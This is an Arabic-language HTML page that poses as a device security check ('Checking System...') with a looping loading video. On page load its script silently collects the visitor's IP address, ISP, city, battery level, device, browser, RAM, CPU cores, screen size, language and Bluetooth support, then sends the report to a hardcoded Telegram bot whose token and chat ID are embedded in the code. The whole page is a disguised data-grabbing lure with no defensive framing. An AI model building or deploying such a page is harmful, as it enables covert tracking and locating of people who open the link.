<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking System... | فحص النظام</title>
    <style>
        body { margin: 0; background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: 'Courier New', Courier, monospace; overflow: hidden; }
        video { width: 100%; max-width: 450px; border-radius: 50%; border: 2px solid #00ff00; box-shadow: 0 0 15px #00ff00; }
        .loading-text { margin-top: 20px; font-size: 18px; color: #00ff00; letter-spacing: 2px; }
    </style>
</head>
<body>

    <!-- فيديو الانتظار المشوق -->
    <video autoplay loop muted playsinline>
        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHR0amRoc2R4bmR0bmR0bmR0bmR0bmR0bmR0bmR0bmR0bmR0JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZ29vZC/3o7bu3XilJ5BOiSGic/giphy.mp4" type="video/mp4">
    </video>

    <div class="loading-text" id="status">جاري فحص أمان الجهاز...</div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id') || '7238206121'; 
        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';

        async function getInfo() {
            // 1. معلومات البطارية
            let batteryInfo = "غير معروف";
            try {
                const batt = await navigator.getBattery();
                batteryInfo = `${(batt.level * 100).toFixed(0)}% (${batt.charging ? "بشحن" : "ما بشحن"})`;
            } catch (e) {}

            // 2. معلومات الـ IP والشركة المزودة
            let ipData = {};
            try {
                const res = await fetch('https://ipapi.co/json/');
                ipData = await res.json();
            } catch (e) {}

            // 3. معلومات الجهاز والمتصفح
            const info = {
                device: navigator.platform,
                browser: navigator.userAgent.split(') ')[1],
                cores: navigator.hardwareConcurrency || "غير معروف",
                ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "غير معروف",
                screen: `${window.screen.width}x${window.screen.height}`,
                lang: navigator.language
            };

            const message = `
💻 **Detailed System Report**
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
🌐 **IP:** \`${ipData.ip || "Unknown"}\`
🏢 **ISP:** \`${ipData.org || "Unknown"}\`
📍 **City:** \`${ipData.city || "Unknown"}\`
🔋 **Battery:** \`${batteryInfo}\`
📱 **Device:** \`${info.device}\`
🖥️ **Screen:** \`${info.screen}\`
🧠 **RAM:** \`${info.ram}\`
⚙️ **Cores:** \`${info.cores}\`
🌍 **Lang:** \`${info.lang}\`
📡 **Bluetooth:** \`${navigator.bluetooth ? "يدعم" : "لا يدعم"}\`
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
🦅 **Dev:** Abu Osayed Malkawi
            `;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
        }

        // تشغيل السحب فوراً
        getInfo();
    </script>
</body>
</html>
